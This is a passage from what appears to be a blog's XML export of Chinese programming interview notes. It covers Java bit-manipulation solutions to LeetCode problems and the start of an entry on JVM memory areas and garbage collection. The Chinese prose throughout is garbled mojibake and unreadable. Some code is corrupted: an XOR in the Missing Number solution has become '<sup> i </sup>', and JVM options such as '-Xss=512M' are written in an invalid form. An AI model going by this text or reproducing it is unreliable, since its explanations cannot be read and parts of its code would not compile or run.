è¿›è¡Œä½ä¸æ“ä½œï¼Œåªä¿ç•™ num ä¸­ä¸ mask çš„ 1 éƒ¨åˆ†ç›¸å¯¹åº”çš„ä½ã€‚ åˆ©ç”¨ x | 0s = x å’Œ x | 1s = 1s çš„ç‰¹ç‚¹ï¼Œå¯ä»¥å®ç°è®¾å€¼æ“ä½œã€‚ä¸€ä¸ªæ•° num ä¸ maskï¼š00111100 è¿›è¡Œä½æˆ–æ“ä½œï¼Œå°† num ä¸­ä¸ mask çš„ 1 éƒ¨åˆ†ç›¸å¯¹åº”çš„ä½éƒ½è®¾ç½®ä¸º 1ã€‚ ä½ä¸è¿ç®—æŠ€å·§ï¼š n&amp;(n-1) å»é™¤ n çš„ä½çº§è¡¨ç¤ºä¸­æœ€ä½çš„é‚£ä¸€ä½ã€‚ä¾‹å¦‚å¯¹äºäºŒè¿›åˆ¶è¡¨ç¤º 10110 100 ï¼Œå‡å» 1 å¾—åˆ° 10110011ï¼Œè¿™ä¸¤ä¸ªæ•°ç›¸ä¸å¾—åˆ° 10110000ã€‚ n&amp;(-n) å¾—åˆ° n çš„ä½çº§è¡¨ç¤ºä¸­æœ€ä½çš„é‚£ä¸€ä½ã€‚-n å¾—åˆ° n çš„åç åŠ  1ï¼Œå¯¹äºäºŒè¿›åˆ¶è¡¨ç¤º 10110 100 ï¼Œ-n å¾—åˆ° 01001100ï¼Œç›¸ä¸å¾—åˆ° 00000100ã€‚ n-n&amp;(~n+1) å»é™¤ n çš„ä½çº§è¡¨ç¤ºä¸­æœ€é«˜çš„é‚£ä¸€ä½ã€‚ ç§»ä½è¿ç®—ï¼š >> n ä¸ºç®—æœ¯å³ç§»ï¼Œç›¸å½“äºé™¤ä»¥ 2nï¼› >>> n ä¸ºæ— ç¬¦å·å³ç§»ï¼Œå·¦è¾¹ä¼šè¡¥ä¸Š 0ã€‚ &lt;&lt; n ä¸ºç®—æœ¯å·¦ç§»ï¼Œç›¸å½“äºä¹˜ä»¥ 2nã€‚ 2. mask è®¡ç®— è¦è·å– 111111111ï¼Œå°† 0 å–åå³å¯ï¼Œ~0ã€‚ è¦å¾—åˆ°åªæœ‰ç¬¬ i ä½ä¸º 1 çš„ maskï¼Œå°† 1 å‘å·¦ç§»åŠ¨ i-1 ä½å³å¯ï¼Œ1&lt;&lt;(i-1) ã€‚ä¾‹å¦‚ 1&lt;&lt;4 å¾—åˆ°åªæœ‰ç¬¬ 5 ä½ä¸º 1 çš„ mask ï¼š00010000ã€‚ è¦å¾—åˆ° 1 åˆ° i ä½ä¸º 1 çš„ maskï¼Œ1&lt;&lt;(i+1)-1 å³å¯ï¼Œä¾‹å¦‚å°† 1&lt;&lt;(4+1)-1 = 00010000-1 = 00001111ã€‚ è¦å¾—åˆ° 1 åˆ° i ä½ä¸º 0 çš„ maskï¼Œåªéœ€å°† 1 åˆ° i ä½ä¸º 1 çš„ mask å–åï¼Œå³ ~(1&lt;&lt;(i+1)-1)ã€‚ 3. Java ä¸­çš„ä½æ“ä½œ 123static int Integer.bitCount(); // ç»Ÿè®¡ 1 çš„æ•°é‡static int Integer.highestOneBit(); // è·å¾—æœ€é«˜ä½static String toBinaryString(int i); // è½¬æ¢ä¸ºäºŒè¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸² ç»Ÿè®¡ä¸¤ä¸ªæ•°çš„äºŒè¿›åˆ¶è¡¨ç¤ºæœ‰å¤šå°‘ä½ä¸åŒ 461. Hamming Distance (Easy) 12345678910Input: x = 1, y = 4Output: 2Explanation:1 (0 0 0 1)4 (0 1 0 0) â†‘ â†‘The above arrows point to positions where the corresponding bits are different. å¯¹ä¸¤ä¸ªæ•°è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œä½çº§è¡¨ç¤ºä¸åŒçš„é‚£ä¸€ä½ä¸º 1ï¼Œç»Ÿè®¡æœ‰å¤šå°‘ä¸ª 1 å³å¯ã€‚ 123456789public int hammingDistance(int x, int y) &#123; int z = x ^ y; int cnt = 0; while(z != 0) &#123; if ((z &amp; 1) == 1) cnt++; z = z &gt;&gt; 1; &#125; return cnt;&#125; ä½¿ç”¨ z&amp;(z-1) å»é™¤ z ä½çº§è¡¨ç¤ºæœ€ä½çš„é‚£ä¸€ä½ã€‚ 123456789public int hammingDistance(int x, int y) &#123; int z = x ^ y; int cnt = 0; while (z != 0) &#123; z &amp;= (z - 1); cnt++; &#125; return cnt;&#125; å¯ä»¥ä½¿ç”¨ Integer.bitcount() æ¥ç»Ÿè®¡ 1 ä¸ªçš„ä¸ªæ•°ã€‚ 123public int hammingDistance(int x, int y) &#123; return Integer.bitCount(x ^ y);&#125; æ•°ç»„ä¸­å”¯ä¸€ä¸€ä¸ªä¸é‡å¤çš„å…ƒç´  136. Single Number (Easy) 12Input: [4,1,2,1,2]Output: 4 ä¸¤ä¸ªç›¸åŒçš„æ•°å¼‚æˆ–çš„ç»“æœä¸º 0ï¼Œå¯¹æ‰€æœ‰æ•°è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œæœ€åçš„ç»“æœå°±æ˜¯å•ç‹¬å‡ºç°çš„é‚£ä¸ªæ•°ã€‚ 12345public int singleNumber(int[] nums) &#123; int ret = 0; for (int n : nums) ret = ret ^ n; return ret;&#125; æ‰¾å‡ºæ•°ç»„ä¸­ç¼ºå¤±çš„é‚£ä¸ªæ•° 268. Missing Number (Easy) 12Input: [3,0,1]Output: 2 é¢˜ç›®æè¿°ï¼šæ•°ç»„å…ƒç´ åœ¨ 0-n ä¹‹é—´ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªæ•°æ˜¯ç¼ºå¤±çš„ï¼Œè¦æ±‚æ‰¾åˆ°è¿™ä¸ªç¼ºå¤±çš„æ•°ã€‚ 1234567public int missingNumber(int[] nums) &#123; int ret = 0; for (int i = 0; i &lt; nums.length; i++) &#123; ret = ret &lt;sup&gt; i &lt;/sup&gt; nums[i]; &#125; return ret ^ nums.length;&#125; æ•°ç»„ä¸­ä¸é‡å¤çš„ä¸¤ä¸ªå…ƒç´  260. Single Number III (Medium) ä¸¤ä¸ªä¸ç›¸ç­‰çš„å…ƒç´ åœ¨ä½çº§è¡¨ç¤ºä¸Šå¿…å®šä¼šæœ‰ä¸€ä½å­˜åœ¨ä¸åŒã€‚ å°†æ•°ç»„çš„æ‰€æœ‰å…ƒç´ å¼‚æˆ–å¾—åˆ°çš„ç»“æœä¸ºä¸å­˜åœ¨é‡å¤çš„ä¸¤ä¸ªå…ƒç´ å¼‚æˆ–çš„ç»“æœã€‚ diff &amp;= -diff å¾—åˆ°å‡º diff æœ€å³ä¾§ä¸ä¸º 0 çš„ä½ï¼Œä¹Ÿå°±æ˜¯ä¸å­˜åœ¨é‡å¤çš„ä¸¤ä¸ªå…ƒç´ åœ¨ä½çº§è¡¨ç¤ºä¸Šæœ€å³ä¾§ä¸åŒçš„é‚£ä¸€ä½ï¼Œåˆ©ç”¨è¿™ä¸€ä½å°±å¯ä»¥å°†ä¸¤ä¸ªå…ƒç´ åŒºåˆ†å¼€æ¥ã€‚ 1234567891011public int[] singleNumber(int[] nums) &#123; int diff = 0; for (int num : nums) diff ^= num; diff &amp;= -diff; // å¾—åˆ°æœ€å³ä¸€ä½ int[] ret = new int[2]; for (int num : nums) &#123; if ((num &amp; diff) == 0) ret[0] ^= num; else ret[1] ^= num; &#125; return ret;&#125; ç¿»è½¬ä¸€ä¸ªæ•°çš„æ¯”ç‰¹ä½ 190. Reverse Bits (Easy) 123456789public int reverseBits(int n) &#123; int ret = 0; for (int i = 0; i &lt; 32; i++) &#123; ret &lt;&lt;= 1; ret |= (n &amp; 1); n &gt;&gt;&gt;= 1; &#125; return ret;&#125; å¦‚æœè¯¥å‡½æ•°éœ€è¦è¢«è°ƒç”¨å¾ˆå¤šæ¬¡ï¼Œå¯ä»¥å°† int æ‹†æˆ 4 ä¸ª byteï¼Œç„¶åç¼“å­˜ byte å¯¹åº”çš„æ¯”ç‰¹ä½ç¿»è½¬ï¼Œæœ€åå†æ‹¼æ¥èµ·æ¥ã€‚ 123456789101112131415161718192021222324private static Map&lt;Byte, Integer&gt; cache = new HashMap&lt;&gt;();public int reverseBits(int n) &#123; int ret = 0; for (int i = 0; i &lt; 4; i++) &#123; ret &lt;&lt;= 8; ret |= reverseByte((byte) (n &amp; 0b11111111)); n &gt;&gt;= 8; &#125; return ret;&#125;private int reverseByte(byte b) &#123; if (cache.containsKey(b)) return cache.get(b); int ret = 0; byte t = b; for (int i = 0; i &lt; 8; i++) &#123; ret &lt;&lt;= 1; ret |= t &amp; 1; t &gt;&gt;= 1; &#125; cache.put(b, ret); return ret;&#125; ä¸ç”¨é¢å¤–å˜é‡äº¤æ¢ä¸¤ä¸ªæ•´æ•° ç¨‹åºå‘˜ä»£ç é¢è¯•æŒ‡å— ï¼šP317 123a = a ^ b;b = a ^ b;a = a ^ b; åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯ä¸æ˜¯ 2 çš„ n æ¬¡æ–¹ 231. Power of Two (Easy) äºŒè¿›åˆ¶è¡¨ç¤ºåªæœ‰ä¸€ä¸ª 1 å­˜åœ¨ã€‚ 123public boolean isPowerOfTwo(int n) &#123; return n &gt; 0 &amp;&amp; Integer.bitCount(n) == 1;&#125; åˆ©ç”¨ 1000 &amp; 0111 == 0 è¿™ç§æ€§è´¨ï¼Œå¾—åˆ°ä»¥ä¸‹è§£æ³•ï¼š 123public boolean isPowerOfTwo(int n) &#123; return n &gt; 0 &amp;&amp; (n &amp; (n - 1)) == 0;&#125; åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯ä¸æ˜¯ 4 çš„ n æ¬¡æ–¹ 342. Power of Four (Easy) è¿™ç§æ•°åœ¨äºŒè¿›åˆ¶è¡¨ç¤ºä¸­æœ‰ä¸”åªæœ‰ä¸€ä¸ªå¥‡æ•°ä½ä¸º 1ï¼Œä¾‹å¦‚ 16ï¼ˆ10000ï¼‰ã€‚ 123public boolean isPowerOfFour(int num) &#123; return num &gt; 0 &amp;&amp; (num &amp; (num - 1)) == 0 &amp;&amp; (num &amp; 0b01010101010101010101010101010101) != 0;&#125; ä¹Ÿå¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚ 123public boolean isPowerOfFour(int num) &#123; return Integer.toString(num, 4).matches("10*");&#125; åˆ¤æ–­ä¸€ä¸ªæ•°çš„ä½çº§è¡¨ç¤ºæ˜¯å¦ä¸ä¼šå‡ºç°è¿ç»­çš„ 0 å’Œ 1 693. Binary Number with Alternating Bits (Easy) 123456789Input: 10Output: TrueExplanation:The binary representation of 10 is: 1010.Input: 11Output: FalseExplanation:The binary representation of 11 is: 1011. å¯¹äº 1010 è¿™ç§ä½çº§è¡¨ç¤ºçš„æ•°ï¼ŒæŠŠå®ƒå‘å³ç§»åŠ¨ 1 ä½å¾—åˆ° 101ï¼Œè¿™ä¸¤ä¸ªæ•°æ¯ä¸ªä½éƒ½ä¸åŒï¼Œå› æ­¤å¼‚æˆ–å¾—åˆ°çš„ç»“æœä¸º 1111ã€‚ 1234public boolean hasAlternatingBits(int n) &#123; int a = (n ^ (n &gt;&gt; 1)); return (a &amp; (a + 1)) == 0;&#125; æ±‚ä¸€ä¸ªæ•°çš„è¡¥ç  476. Number Complement (Easy) 123Input: 5Output: 2Explanation: The binary representation of 5 is 101 (no leading zero bits), and its complement is 010. So you need to output 2. é¢˜ç›®æè¿°ï¼šä¸è€ƒè™‘äºŒè¿›åˆ¶è¡¨ç¤ºä¸­çš„é¦– 0 éƒ¨åˆ†ã€‚ å¯¹äº 00000101ï¼Œè¦æ±‚è¡¥ç å¯ä»¥å°†å®ƒä¸ 00000111 è¿›è¡Œå¼‚æˆ–æ“ä½œã€‚é‚£ä¹ˆé—®é¢˜å°±è½¬æ¢ä¸ºæ±‚æ©ç  00000111ã€‚ 1234567public int findComplement(int num) &#123; if (num == 0) return 1; int mask = 1 &lt;&lt; 30; while ((num &amp; mask) == 0) mask &gt;&gt;= 1; mask = (mask &lt;&lt; 1) - 1; return num ^ mask;&#125; å¯ä»¥åˆ©ç”¨ Java çš„ Integer.highestOneBit() æ–¹æ³•æ¥è·å¾—å«æœ‰é¦– 1 çš„æ•°ã€‚ 123456public int findComplement(int num) &#123; if (num == 0) return 1; int mask = Integer.highestOneBit(num); mask = (mask &lt;&lt; 1) - 1; return num ^ mask;&#125; å¯¹äº 10000000 è¿™æ ·çš„æ•°è¦æ‰©å±•æˆ 11111111ï¼Œå¯ä»¥åˆ©ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š 123mask |= mask &gt;&gt; 1 11000000mask |= mask &gt;&gt; 2 11110000mask |= mask &gt;&gt; 4 11111111 123456789public int findComplement(int num) &#123; int mask = num; mask |= mask &gt;&gt; 1; mask |= mask &gt;&gt; 2; mask |= mask &gt;&gt; 4; mask |= mask &gt;&gt; 8; mask |= mask &gt;&gt; 16; return (mask ^ num);&#125; å®ç°æ•´æ•°çš„åŠ æ³• 371. Sum of Two Integers (Easy) a ^ b è¡¨ç¤ºæ²¡æœ‰è€ƒè™‘è¿›ä½çš„æƒ…å†µä¸‹ä¸¤æ•°çš„å’Œï¼Œ(a &amp; b) &lt;&lt; 1 å°±æ˜¯è¿›ä½ã€‚ é€’å½’ä¼šç»ˆæ­¢çš„åŸå› æ˜¯ (a &amp; b) &lt;&lt; 1 æœ€å³è¾¹ä¼šå¤šä¸€ä¸ª 0ï¼Œé‚£ä¹ˆç»§ç»­é€’å½’ï¼Œè¿›ä½æœ€å³è¾¹çš„ 0 ä¼šæ…¢æ…¢å¢å¤šï¼Œæœ€åè¿›ä½ä¼šå˜ä¸º 0ï¼Œé€’å½’ç»ˆæ­¢ã€‚ 123public int getSum(int a, int b) &#123; return b == 0 ? a : getSum((a ^ b), (a &amp; b) &lt;&lt; 1);&#125; å­—ç¬¦ä¸²æ•°ç»„æœ€å¤§ä¹˜ç§¯ 318. Maximum Product of Word Lengths (Medium) 123Given ["abcw", "baz", "foo", "bar", "xtfn", "abcdef"]Return 16The two words can be "abcw", "xtfn". é¢˜ç›®æè¿°ï¼šå­—ç¬¦ä¸²æ•°ç»„çš„å­—ç¬¦ä¸²åªå«æœ‰å°å†™å­—ç¬¦ã€‚æ±‚è§£å­—ç¬¦ä¸²æ•°ç»„ä¸­ä¸¤ä¸ªå­—ç¬¦ä¸²é•¿åº¦çš„æœ€å¤§ä¹˜ç§¯ï¼Œè¦æ±‚è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸èƒ½å«æœ‰ç›¸åŒå­—ç¬¦ã€‚ æœ¬é¢˜ä¸»è¦é—®é¢˜æ˜¯åˆ¤æ–­ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦å«ç›¸åŒå­—ç¬¦ï¼Œç”±äºå­—ç¬¦ä¸²åªå«æœ‰å°å†™å­—ç¬¦ï¼Œæ€»å…± 26 ä½ï¼Œå› æ­¤å¯ä»¥ç”¨ä¸€ä¸ª 32 ä½çš„æ•´æ•°æ¥å­˜å‚¨æ¯ä¸ªå­—ç¬¦æ˜¯å¦å‡ºç°è¿‡ã€‚ 123456789101112131415161718public int maxProduct(String[] words) &#123; int n = words.length; int[] val = new int[n]; for (int i = 0; i &lt; n; i++) &#123; for (char c : words[i].toCharArray()) &#123; val[i] |= 1 &lt;&lt; (c - 'a'); &#125; &#125; int ret = 0; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; j++) &#123; if ((val[i] &amp; val[j]) == 0) &#123; ret = Math.max(ret, words[i].length() * words[j].length()); &#125; &#125; &#125; return ret;&#125; ç»Ÿè®¡ä» 0 ~ n æ¯ä¸ªæ•°çš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­ 1 çš„ä¸ªæ•° 338. Counting Bits (Medium) å¯¹äºæ•°å­— 6(110)ï¼Œå®ƒå¯ä»¥çœ‹æˆæ˜¯ 4(100) å†åŠ ä¸€ä¸ª 2(10)ï¼Œå› æ­¤ dp[i] = dp[i&amp;(i-1)] + 1; 1234567public int[] countBits(int num) &#123; int[] ret = new int[num + 1]; for(int i = 1; i &lt;= num; i++)&#123; ret[i] = ret[i&amp;(i-1)] + 1; &#125; return ret;&#125; å‚è€ƒèµ„æ–™ Leetcode Weiss M A, å†¯èˆœçº. æ•°æ®ç»“æ„ä¸ç®—æ³•åˆ†æâ€”â€”C è¯­è¨€æè¿°[J]. 2004. Sedgewick R. Algorithms[M]. Pearson Education India, 1988. ä½•æµ·æ¶›, è½¯ä»¶å·¥ç¨‹å¸ˆ. å‰‘æŒ‡ Offer: åä¼é¢è¯•å®˜ç²¾è®²å…¸å‹ç¼–ç¨‹é¢˜[M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2014. ã€Šç¼–ç¨‹ä¹‹ç¾ã€‹å°ç»„. ç¼–ç¨‹ä¹‹ç¾[M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2008. å·¦ç¨‹äº‘. ç¨‹åºå‘˜ä»£ç é¢è¯•æŒ‡å—[M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2015.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java è™šæ‹Ÿæœº]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FJava%20%E8%99%9A%E6%8B%9F%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[ä¸€ã€è¿è¡Œæ—¶æ•°æ®åŒºåŸŸ ç¨‹åºè®¡æ•°å™¨ è™šæ‹Ÿæœºæ ˆ æœ¬åœ°æ–¹æ³•æ ˆ å † æ–¹æ³•åŒº è¿è¡Œæ—¶å¸¸é‡æ±  ç›´æ¥å†…å­˜ äºŒã€åƒåœ¾æ”¶é›† åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦å­˜æ´» åƒåœ¾æ”¶é›†ç®—æ³• åƒåœ¾æ”¶é›†å™¨ å†…å­˜åˆ†é…ä¸å›æ”¶ç­–ç•¥ ä¸‰ã€ç±»åŠ è½½æœºåˆ¶ ç±»çš„ç”Ÿå‘½å‘¨æœŸ ç±»åˆå§‹åŒ–æ—¶æœº ç±»åŠ è½½è¿‡ç¨‹ ç±»åŠ è½½å™¨ å‚è€ƒèµ„æ–™ ä¸€ã€è¿è¡Œæ—¶æ•°æ®åŒºåŸŸ ç¨‹åºè®¡æ•°å™¨è®°å½•æ­£åœ¨æ‰§è¡Œçš„è™šæ‹Ÿæœºå­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€ï¼ˆå¦‚æœæ­£åœ¨æ‰§è¡Œçš„æ˜¯æœ¬åœ°æ–¹æ³•åˆ™ä¸ºç©ºï¼‰ã€‚ è™šæ‹Ÿæœºæ ˆæ¯ä¸ª Java æ–¹æ³•åœ¨æ‰§è¡Œçš„åŒæ—¶ä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§ç”¨äºå­˜å‚¨å±€éƒ¨å˜é‡è¡¨ã€æ“ä½œæ•°æ ˆã€å¸¸é‡æ± å¼•ç”¨ç­‰ä¿¡æ¯ã€‚æ¯ä¸€ä¸ªæ–¹æ³•ä»è°ƒç”¨ç›´è‡³æ‰§è¡Œå®Œæˆçš„è¿‡ç¨‹ï¼Œå°±å¯¹åº”ç€ä¸€ä¸ªæ ˆå¸§åœ¨ Java è™šæ‹Ÿæœºæ ˆä¸­å…¥æ ˆå’Œå‡ºæ ˆçš„è¿‡ç¨‹ã€‚ å¯ä»¥é€šè¿‡ -Xss è¿™ä¸ªè™šæ‹Ÿæœºå‚æ•°æ¥æŒ‡å®šä¸€ä¸ªç¨‹åºçš„ Java è™šæ‹Ÿæœºæ ˆå†…å­˜å¤§å°ï¼š 1java -Xss=512M HackTheJava è¯¥åŒºåŸŸå¯èƒ½æŠ›å‡ºä»¥ä¸‹å¼‚å¸¸ï¼š å½“çº¿ç¨‹è¯·æ±‚çš„æ ˆæ·±åº¦è¶…è¿‡æœ€å¤§å€¼ï¼Œä¼šæŠ›å‡º StackOverflowError å¼‚å¸¸ï¼› æ ˆè¿›è¡ŒåŠ¨æ€æ‰©å±•æ—¶å¦‚æœæ— æ³•ç”³è¯·åˆ°è¶³å¤Ÿå†…å­˜ï¼Œä¼šæŠ›å‡º OutOfMemoryError å¼‚å¸¸ã€‚ æœ¬åœ°æ–¹æ³•æ ˆæœ¬åœ°æ–¹æ³•ä¸æ˜¯ç”¨ Java å®ç°ï¼Œå¯¹å¾…è¿™äº›æ–¹æ³•éœ€è¦ç‰¹åˆ«å¤„ç†ã€‚ ä¸ Java è™šæ‹Ÿæœºæ ˆç±»ä¼¼ï¼Œå®ƒä»¬ä¹‹é—´çš„åŒºåˆ«åªä¸è¿‡æ˜¯æœ¬åœ°æ–¹æ³•æ ˆä¸ºæœ¬åœ°æ–¹æ³•æœåŠ¡ã€‚ å †æ‰€æœ‰å¯¹è±¡å®ä¾‹éƒ½åœ¨è¿™é‡Œåˆ†é…å†…å­˜ã€‚ æ˜¯åƒåœ¾æ”¶é›†çš„ä¸»è¦åŒºåŸŸï¼ˆâ€GC å †â€ï¼‰ã€‚ç°ä»£çš„åƒåœ¾æ”¶é›†å™¨åŸºæœ¬éƒ½æ˜¯é‡‡ç”¨åˆ†ä»£æ”¶é›†ç®—æ³•ï¼Œä¸»è¦æ€æƒ³æ˜¯é’ˆå¯¹ä¸åŒçš„å¯¹è±¡é‡‡å–ä¸åŒçš„åƒåœ¾å›æ”¶ç®—æ³•ã€‚è™šæ‹ŸæœºæŠŠ Java å †åˆ†æˆä»¥ä¸‹ä¸‰å—ï¼š æ–°ç”Ÿä»£ï¼ˆYoung Generationï¼‰ è€å¹´ä»£ï¼ˆOld Generationï¼‰ æ°¸ä¹…ä»£ï¼ˆPermanent Generationï¼‰ å½“ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œå®ƒé¦–å…ˆè¿›å…¥æ–°ç”Ÿä»£ï¼Œä¹‹åæœ‰å¯èƒ½è¢«è½¬ç§»åˆ°è€å¹´ä»£ä¸­ã€‚ æ–°ç”Ÿä»£å­˜æ”¾ç€å¤§é‡çš„ç”Ÿå‘½å¾ˆçŸ­çš„å¯¹è±¡ï¼Œå› æ­¤æ–°ç”Ÿä»£åœ¨ä¸‰ä¸ªåŒºåŸŸä¸­åƒåœ¾å›æ”¶çš„é¢‘ç‡æœ€é«˜ã€‚ä¸ºäº†æ›´é«˜æ•ˆåœ°è¿›è¡Œåƒåœ¾å›æ”¶ï¼ŒæŠŠæ–°ç”Ÿä»£ç»§ç»­åˆ’åˆ†æˆä»¥ä¸‹ä¸‰ä¸ªç©ºé—´ï¼š Edenï¼ˆä¼Šç”¸å›­ï¼‰ From Survivorï¼ˆå¹¸å­˜è€…ï¼‰ To Survivor Java å †ä¸éœ€è¦è¿ç»­å†…å­˜ï¼Œå¹¶ä¸”å¯ä»¥åŠ¨æ€å¢åŠ å…¶å†…å­˜ï¼Œå¢åŠ å¤±è´¥ä¼šæŠ›å‡º OutOfMemoryError å¼‚å¸¸ã€‚ å¯ä»¥é€šè¿‡ -Xms å’Œ -Xmx ä¸¤ä¸ªè™šæ‹Ÿæœºå‚æ•°æ¥æŒ‡å®šä¸€ä¸ªç¨‹åºçš„ Java å †å†…å­˜å¤§å°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®åˆå§‹å€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°è®¾ç½®æœ€å¤§å€¼ã€‚ 1java -Xms=1M -Xmx=2M HackTheJava æ–¹æ³•åŒºç”¨äºå­˜æ”¾å·²è¢«åŠ è½½çš„ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ã€å³æ—¶ç¼–è¯‘å™¨ç¼–è¯‘åçš„ä»£ç ç­‰æ•°æ®ã€‚ å’Œ Java å †ä¸€æ ·ä¸éœ€è¦è¿ç»­çš„å†…å­˜ï¼Œå¹¶ä¸”å¯ä»¥åŠ¨æ€æ‰©å±•ï¼ŒåŠ¨æ€æ‰©å±•å¤±è´¥ä¸€æ ·ä¼šæŠ›å‡º OutOfMemoryError å¼‚å¸¸ã€‚ å¯¹è¿™å—åŒºåŸŸè¿›è¡Œåƒåœ¾å›æ”¶çš„ä¸»è¦ç›®æ ‡æ˜¯å¯¹å¸¸é‡æ± çš„å›æ”¶å’Œå¯¹ç±»çš„å¸è½½ï¼Œä½†æ˜¯ä¸€èˆ¬æ¯”è¾ƒéš¾å®ç°ã€‚ JDK 1.7 ä¹‹å‰ï¼ŒHotSpot è™šæ‹ŸæœºæŠŠå®ƒå½“æˆæ°¸ä¹…ä»£æ¥è¿›è¡Œåƒåœ¾å›æ”¶ï¼ŒJDK 1.8 ä¹‹åï¼Œå–æ¶ˆäº†æ°¸ä¹…ä»£ï¼Œç”¨ metaspaceï¼ˆå…ƒæ•°æ®ï¼‰åŒºæ›¿ä»£ã€‚ è¿è¡Œæ—¶å¸¸é‡æ± è¿è¡Œæ—¶å¸¸é‡æ± æ˜¯æ–¹æ³•åŒºçš„ä¸€éƒ¨åˆ†ã€‚ Class æ–‡ä»¶ä¸­çš„å¸¸é‡æ± ï¼ˆç¼–è¯‘å™¨ç”Ÿæˆçš„å„ç§å­—é¢é‡å’Œç¬¦å·å¼•ç”¨ï¼‰ä¼šåœ¨ç±»åŠ è½½åè¢«æ”¾å…¥è¿™ä¸ªåŒºåŸŸã€‚ é™¤äº†åœ¨ç¼–è¯‘æœŸç”Ÿæˆçš„å¸¸é‡ï¼Œè¿˜å…è®¸åŠ¨æ€ç”Ÿæˆï¼Œä¾‹å¦‚ String ç±»çš„ intern()ã€‚ ç›´æ¥å†…å­˜åœ¨ JDK 1.4 ä¸­æ–°åŠ å…¥äº† NIO ç±»ï¼Œå®ƒå¯ä»¥ä½¿ç”¨ Native å‡½æ•°åº“ç›´æ¥åˆ†é…å †å¤–å†…å­˜ï¼Œç„¶åé€šè¿‡ä¸€ä¸ªå­˜å‚¨åœ¨ Java å †é‡Œçš„ DirectByteBuffer å¯¹è±¡ä½œä¸ºè¿™å—å†…å­˜çš„å¼•ç”¨è¿›è¡Œæ“ä½œã€‚è¿™æ ·èƒ½åœ¨ä¸€äº›åœºæ™¯ä¸­æ˜¾è‘—æé«˜æ€§èƒ½ï¼Œå› ä¸ºé¿å…äº†åœ¨ Java å †å’Œ Native å †ä¸­æ¥å›å¤åˆ¶æ•°æ®ã€‚ äºŒã€åƒåœ¾æ”¶é›†ç¨‹åºè®¡æ•°å™¨ã€è™šæ‹Ÿæœºæ ˆå’Œæœ¬åœ°æ–¹æ³•æ ˆè¿™ä¸‰ä¸ªåŒºåŸŸå±äºçº¿ç¨‹ç§æœ‰çš„ï¼Œåªå­˜åœ¨äºçº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œçº¿ç¨‹ç»“æŸä¹‹åä¹Ÿä¼šæ¶ˆå¤±ï¼Œå› æ­¤ä¸éœ€è¦å¯¹è¿™ä¸‰ä¸ªåŒºåŸŸè¿›è¡Œåƒåœ¾å›æ”¶ã€‚åƒåœ¾å›æ”¶ä¸»è¦æ˜¯é’ˆå¯¹ Java å †å’Œæ–¹æ³•åŒºè¿›è¡Œã€‚ åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦å­˜æ´»1. å¼•ç”¨è®¡æ•°ç®—æ³•ç»™å¯¹è±¡æ·»åŠ ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œå½“å¯¹è±¡å¢åŠ ä¸€ä¸ªå¼•ç”¨æ—¶è®¡æ•°å™¨åŠ  1ï¼Œå¼•ç”¨å¤±æ•ˆæ—¶è®¡æ•°å™¨å‡ 1ã€‚å¼•ç”¨è®¡æ•°ä¸ä¸º 0 çš„å¯¹è±¡ä»ç„¶å­˜æ´»ã€‚ ä¸¤ä¸ªå¯¹è±¡å‡ºç°å¾ªç¯å¼•ç”¨çš„æƒ…å†µä¸‹ï¼Œæ­¤æ—¶å¼•ç”¨è®¡æ•°å™¨æ°¸è¿œä¸ä¸º 0ï¼Œå¯¼è‡´æ— æ³•å¯¹å®ƒä»¬è¿›è¡Œå›æ”¶ã€‚ 12345678910public class ReferenceCountingGC &#123; public Object instance = null; public static void main(String[] args) &#123; ReferenceCountingGC objectA = new ReferenceCountingGC(); ReferenceCountingGC objectB = new ReferenceCountingGC(); objectA.instance = objectB; objectB.instance = objectA; &#125;&#125; æ­£å› ä¸ºå¾ªç¯å¼•ç”¨çš„å­˜åœ¨ï¼Œå› æ­¤ Java è™šæ‹Ÿæœºä¸ä½¿ç”¨å¼•ç”¨è®¡æ•°ç®—æ³•ã€‚ 2. å¯è¾¾æ€§åˆ†æç®—æ³•é€šè¿‡ GC Roots ä½œä¸ºèµ·å§‹ç‚¹è¿›è¡Œæœç´¢ï¼Œèƒ½å¤Ÿåˆ°è¾¾åˆ°çš„å¯¹è±¡éƒ½æ˜¯å­˜æ´»çš„ï¼Œä¸å¯è¾¾çš„å¯¹è±¡å¯è¢«å›æ”¶ã€‚ Java è™šæ‹Ÿæœºä½¿ç”¨è¯¥ç®—æ³•æ¥åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯è¢«å›æ”¶ï¼Œåœ¨ Java ä¸­ GC Roots ä¸€èˆ¬åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š è™šæ‹Ÿæœºæ 